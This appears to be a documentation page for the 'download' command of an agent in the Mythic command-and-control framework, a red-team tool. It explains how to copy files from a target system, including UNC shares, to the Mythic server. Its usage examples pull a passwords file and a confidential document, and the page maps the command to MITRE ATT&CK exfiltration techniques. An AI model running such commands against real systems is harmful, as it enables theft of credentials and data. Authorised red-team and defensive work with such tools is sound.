+++
title = "download"
chapter = false
weight = 103
hidden = false
+++

## Summary
Download a file from the target system to the Mythic server. Supports local paths and UNC paths.

### Arguments

#### path
The path of the file to download. UNC paths (e.g., `\\server\share\file`) are supported.

## Usage
```
download -path <file path>
```

Example
```
download -path C:\Users\bob\Documents\passwords.txt
download -path \\fileserver\share\confidential.docx
```

## MITRE ATT&CK Mapping

- T1020
- T1030
- T1041
